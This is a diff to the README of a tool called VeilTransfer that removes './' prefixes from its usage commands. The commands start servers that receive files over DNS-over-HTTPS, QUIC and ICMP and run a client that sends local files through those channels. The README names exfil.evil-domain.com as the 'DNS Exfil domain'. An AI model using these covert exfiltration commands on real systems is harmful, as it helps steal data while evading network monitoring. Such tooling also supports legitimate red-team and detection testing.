@@ -118,7 +118,7 @@ The domain exfil.evil-domain.com will serve as the DNS Exfil domain.
 
 Then, start the VeilTransfer Server in DoH mode with the following command:
 ```bash
-./veiltransfer_server doh -key ag36rjsg284nfk2g -folder /root/data/exfil
+veiltransfer_server doh -key ag36rjsg284nfk2g -folder /root/data/exfil
 ```
 Note: The encryption key (-key) must be 16 or 32 characters long.
 
@@ -130,7 +130,7 @@ veiltransfer_client transfer doh -localPath /path/to/file_or_directory -key ag36
 #### Transfer Files via QUIC
 To start the VeilTransfer server in QUIC mode, use the following command:
 ```bash
-./veiltransfer_server quic -cert /path/server.crt -key /path/server.key
+veiltransfer_server quic -cert /path/server.crt -key /path/server.key
 ```
 
 Once the server is running, you can upload files or directories using:
@@ -141,11 +141,11 @@ veiltransfer_client transfer quic -localPath (/path/to/file or /path/to/director
 #### Transfer Files via ICMP
 To enable file transfers via the ICMP protocol, start the VeilTransfer Server in ICMP mode by executing the following command:
 ```bash
-./veiltransfer_server_linux icmp -folder /path/folder
+veiltransfer_server_linux icmp -folder /path/folder
 ```
 Once the server is active, execute the following command to transfer files or directories via ICMP:
 ```bash
-./veiltransfer_client_linux transfer icmp -localPath (/path/to/file or /path/to/directory) -server <ip address>
+veiltransfer_client_linux transfer icmp -localPath (/path/to/file or /path/to/directory) -server <ip address>
 ```
 
 ### Create Zip Files
